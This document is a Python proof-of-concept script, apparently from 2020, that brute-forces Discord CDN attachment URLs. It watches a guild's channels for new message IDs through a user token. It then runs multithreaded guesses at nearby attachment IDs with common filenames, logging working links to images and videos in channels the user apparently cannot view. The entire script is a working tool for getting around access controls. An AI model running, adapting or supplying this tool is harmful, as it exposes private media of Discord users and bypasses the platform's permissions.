## Discord Attachment Guesser
## Proof-of-Concept script for https://pastebin.com/fYtSwgjg
## Date: 2020-01-07
## Author: h0nda (twitter.com/h0nde)

import argparse
import threading
import requests
import time
import sys
from queue import Queue
from datetime import datetime

# Filenames to bruteforce
DEFAULT_FILENAMES = [
    # iOS filenames
    "image0.png", "image0.jpg", "video0.mov",
    # Raw images uploaded to discord (not files) will always have this filename
    "unknown.png"
]
# Steps to take below and above the message ID
DEFAULT_STEPS = [-20, 5]

BASE_URL = "https://discordapp.com/api/v6"
ATTACHMENT_URL_FORMAT = "https://cdn.discordapp.com/attachments/{channel_id}/{attachment_id}/{filename}"

parser = argparse.ArgumentParser(epilog="Author: h0nda (twitter.com/h0nde)")
parser.add_argument("-t", "--token", type=str, required=True, help="Authentication token for Discord")
parser.add_argument("-g", "--guild", type=str, required=True, help="The target guild/server's ID", metavar="GUILD_ID")
parser.add_argument("-c", "--channels", type=str, nargs="+", required=not "--show-channels" in sys.argv and not "-s" in sys.argv, help="Target channel(s) (can be names or IDs)", metavar="channel-name")
parser.add_argument("-f", "--filenames", type=str, default=DEFAULT_FILENAMES, nargs="+", required=False, help="Filename(s) that will be used for bruteforcing", metavar="filename.png")
parser.add_argument("-n", "--steps", type=int, default=DEFAULT_STEPS, nargs=2, required=False, help="Range of steps to try below & above the message ID while bruteforcing attachments (default: -20, 5)")
parser.add_argument("-r", "--retries", type=int, default=10, required=False, help="# of retries if a request fails (default: 10)")
parser.add_argument("-d", "--delay", type=float, default=0.25, required=False, help="Delay for checking messages (in seconds, default: 0.25 sec)")
parser.add_argument("-q", "--threads", type=int, default=25, required=False, help="# of threads that will be used for bruteforcing attachmentss")
parser.add_argument("-i", "--ignore", action="store_true", help="Ignores messages that were sent before the scanning started")
parser.add_argument("-o", "--output", required=False, help="Saves found attachment links into a file", metavar="output.log")
parser.add_argument("-s", "--show-channels", action="store_true", help="Shows all channels of a guild")
args = parser.parse_args()

# Validate steps range
if args.steps[0] > 0:
    exit("Steps[0] must be a negative integer")
elif args.steps[1] < 0:
    exit("Steps[1] must be a positive integer")

# Open output file, if specified via -o
if args.output:
    output_file = open(args.output, "a")

# Class for interacting with a Discord account
class Discord:
    def __init__(self, token):
        # Create a requests session that automatically adds the auth header to sent requests
        self.req = requests.session()
        self.req.headers["Authorization"] = token

    def get_channels(self, guild_id):
        return self.req.get(f"{BASE_URL}/guilds/{guild_id}/channels").json()

# Thread that waits for new messages in queue and bruteforces attachments
def message_queue_thread_func():
    while 1:
        message_id, channel = message_queue.get(block=True)
        success = False

        for step in range(args.steps[0], args.steps[1] + 1):
            attachment_id = int(message_id) + step

            for filename in args.filenames:
                # Put request inside a loop that'll keep repeating if an error occurs
                for _ in range(args.retries):
                    try:
                        # Craft attachment link
                        attachment_url = ATTACHMENT_URL_FORMAT.format(
                            channel_id=channel["id"],
                            attachment_id=attachment_id,
                            filename=filename)

                        # Check if link works
                        success = requests.head(attachment_url, timeout=10).ok
                        if success:
                            attachment_found_callback(attachment_url, message_id, channel)
                        
                        # Break retry loop
                        break
                    except:
                        # Wait before retrying
                        time.sleep(1)
        
        # print(f"Finished bruteforcing Message({message_id}). Success: {success}")

def attachment_found_callback(attachment_url, message_id, channel):
    print(f"Found attachment for message({message_id}) in #{channel['name']}:", attachment_url)

    # Attempt to write attachment link into output file, if one is specified
    if args.output:
        try:
            output_file.write(attachment_url+"\n")
            output_file.flush()
        except Exception as err:
            print("Error while saving output:", err)

session = Discord(args.token)

# Reveals channels of a guild, along with their last activity dates
if args.show_channels:
    for channel in sorted(session.get_channels(args.guild), reverse=True, key=lambda x: int(x.get("last_message_id") or 0)):
        if channel["type"] == 0:
            date = "Never"
            if channel.get("last_message_id"):
                last_message_ts = ((int(channel["last_message_id"]) / 4194304) + 1420070400000)/1000
                date = datetime.utcfromtimestamp(last_message_ts).strftime("%Y-%m-%d %H:%M:%S")
            print(f"#{channel['name']} -- Last Active:", date)
    exit()

# Queue([[message_id<str>, channel<dict>], ..])
message_queue = Queue()
# {channel_id<str>: last_message_id<str>, ..}
message_cache = {}

print("# of requests per message:", len(range(args.steps[0], args.steps[1] + 1)) * len(args.filenames))

# Start threads that will handle the message queue & bruteforcing
for _ in range(args.threads): threading.Thread(target=message_queue_thread_func).start()

# Check for new messages and passes them over to message_queue
while 1:
    try:
        for channel in session.get_channels(args.guild):
            # Skip channel if it's not text-based
            if channel["type"] != 0: continue

            # Skip channel if it is not included in -c arg (by either ID or name)
            if not any(c.lower().replace("#", "") == channel["name"].lower() or channel["id"] == c for c in args.channels):
                continue

            # Skip to next channel if there is no new message
            if channel.get("last_message_id") == message_cache.get(channel["id"]):
                continue

            # Update cache to this message
            message_cache[channel["id"]] = channel["last_message_id"]

            # Skip to next channel if -i is set and message was posted prior
            if args.ignore and not message_cache.get(channel["id"]):
                continue
        
            # Pass message and channel to message_queue
            message_queue.put([channel["last_message_id"], channel])
            print(f"Message({channel['last_message_id']}) posted in #{channel['name']}.", f"Messages in queue: {message_queue.qsize()}")
    except Exception as err:
        print("Error in main loop:", err)
    
    # Wait before checking for new messages (not sure if there is even a ratelimit)
    time.sleep(args.delay)
